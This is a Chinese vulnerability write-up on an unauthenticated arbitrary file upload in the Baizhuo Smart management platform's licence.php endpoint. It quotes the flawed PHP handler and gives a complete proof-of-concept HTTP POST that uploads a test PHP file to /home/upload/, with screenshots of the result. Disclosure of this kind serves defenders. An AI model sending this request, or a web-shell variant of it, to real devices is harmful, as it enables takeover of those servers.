---
title: "百卓Smart管理平台 licence.php 文件上传漏洞"
source: https://mrxn.net/jswz/baizhuosmart-licence-rce.html
asset_dir: assets/百卓smart管理平台-licence.php-文件上传漏洞
---

# 百卓Smart管理平台 licence.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/18 08:20
- 1119浏览
- [0评论](#comment)
- 19分钟阅读

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 licence.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "文件上传")漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")上传恶意后门文件，执行任意指令，从而获得服务器权限并操纵服务器文件。

漏洞修复方案

# 漏洞分析

关键代码如下

```
<?php
if(isset($_POST['mode'])) $mode=$_POST['mode'];
if($mode=="set")
{
    $type=$_POST['ck'];
    if($type == "radhttp") //http
    {
        chdir("/home/");
        if(!is_file("upload")) mkdir("upload",0777);
        $http_licence_dir = "/home/upload/";
        chdir($http_licence_dir);
        exec("rm -rf *");
        $upload_file = $_FILES['file_upload']['tmp_name'];
        $upload_file_name = $_FILES['file_upload']['name'];
        /*echo $upload_file."<br>";
        echo $upload_file_name."<br>";*/

        if(!copy($upload_file,$http_licence_dir.$upload_file_name))
        {
            add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");
            alert("$LANG_UPLOADLICENCE_FAILD","licence.php");
            exit();

        }
        $str = "upgrade licence $http_licence_dir$upload_file_name\n";
        $rbuf = socket($str);
        if(!strstr($rbuf,"0:"))
        {
            add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");
            alert("$LANG_UPDATELICENCE_FAILD","licence.php");
            exit();

        }
        add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_SUCCESS");
        alert("$LANG_UPDATELICENCE_SUCCESS","licence.php");

    }
```

如果 `$mode=="set"`，且 `$type == "radhttp"`，则在 home 目录下创建 upload目录（如果不存在），设置权限并清空upload目录后，直接保存上传文件到此目录。

Windows安全工具

# 漏洞复现

```
POST /sysmanage/licence.php HTTP/1.1
Host: smart.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="mode"

set
------123456
Content-Disposition: form-data; name="ck"

radhttp
------123456
Content-Disposition: form-data; name="file_upload"; filename="test.php"

<?=md5(123456);unlink(__FILE__);
------123456--
```

[[![百卓Smart管理平台 licence.php 文件上传漏洞](images/img-001-20c4e4532fcb.png)](https://mrxn.net/content/uploadfile/202501/89771737119255.png)](https://mrxn.net/content/uploadfile/202501/89771737119255.png)

访问[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "上传文件") /home/upload/test.php

网络安全

[[![百卓Smart管理平台 licence.php 文件上传漏洞](images/img-002-e6dfdc74bc06.png)](https://mrxn.net/content/uploadfile/202501/86d01737119274.png)](https://mrxn.net/content/uploadfile/202501/86d01737119274.png)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
